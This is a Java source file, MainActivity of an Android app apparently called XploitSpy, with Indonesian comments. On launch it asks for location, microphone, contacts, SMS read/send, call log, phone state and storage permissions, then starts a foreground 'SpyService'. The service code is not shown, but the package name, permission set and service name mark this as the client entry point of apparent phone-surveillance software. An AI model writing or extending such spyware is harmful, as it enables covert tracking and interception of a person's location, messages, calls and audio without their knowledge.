package com.xploitspy.client;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.xploitspy.client.service.SpyService;
import java.util.ArrayList;
import java.util.List;

/**
 * Main Activity - Entry point aplikasi
 * Activity ini akan meminta permissions dan memulai service
 */
public class MainActivity extends AppCompatActivity {
    
    private static final int PERMISSION_REQUEST_CODE = 100;
    private TextView statusText;
    private TextView batteryText;
    private TextView deviceIdText;
    private Handler handler = new Handler();
    private Runnable batteryUpdateRunnable;
    
    private String[] requiredPermissions = {
        Manifest.permission.INTERNET,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE
    };
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        statusText = findViewById(R.id.statusText);
        batteryText = findViewById(R.id.batteryText);
        deviceIdText = findViewById(R.id.deviceIdText);
        
        // Set device ID
        deviceIdText.setText("Device ID: " + Config.getDeviceId(this));
        
        // Update battery status
        updateBatteryStatus();
        
        // Start battery monitoring
        batteryUpdateRunnable = new Runnable() {
            @Override
            public void run() {
                updateBatteryStatus();
                handler.postDelayed(this, 5000); // Update every 5 seconds
            }
        };
        handler.post(batteryUpdateRunnable);
        
        // Check dan request permissions
        checkAndRequestPermissions();
        
        // Start service
        startSpyService();
    }
    
    private void updateBatteryStatus() {
        BatteryManager bm = (BatteryManager) getSystemService(Context.BATTERY_SERVICE);
        int batteryLevel = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
        boolean isCharging = bm.isCharging();
        
        String status = "Battery: " + batteryLevel + "%";
        if (isCharging) {
            status += " (Charging)";
        }
        batteryText.setText(status);
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (handler != null && batteryUpdateRunnable != null) {
            handler.removeCallbacks(batteryUpdateRunnable);
        }
    }
    
    private void checkAndRequestPermissions() {
        List<String> permissionsNeeded = new ArrayList<>();
        
        for (String permission : requiredPermissions) {
            if (ContextCompat.checkSelfPermission(this, permission) 
                    != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(permission);
            }
        }
        
        if (!permissionsNeeded.isEmpty()) {
            ActivityCompat.requestPermissions(
                this,
                permissionsNeeded.toArray(new String[0]),
                PERMISSION_REQUEST_CODE
            );
        }
    }
    
    private void startSpyService() {
        Intent serviceIntent = new Intent(this, SpyService.class);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, 
                                          String[] permissions, 
                                          int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            
            if (allGranted) {
                statusText.setText("Service berjalan - Semua permissions granted");
                Toast.makeText(this, "Permissions granted", Toast.LENGTH_SHORT).show();
            } else {
                statusText.setText("Service berjalan - Beberapa permissions denied");
                Toast.makeText(this, "Some permissions denied", Toast.LENGTH_SHORT).show();
            }
        }
    }
}

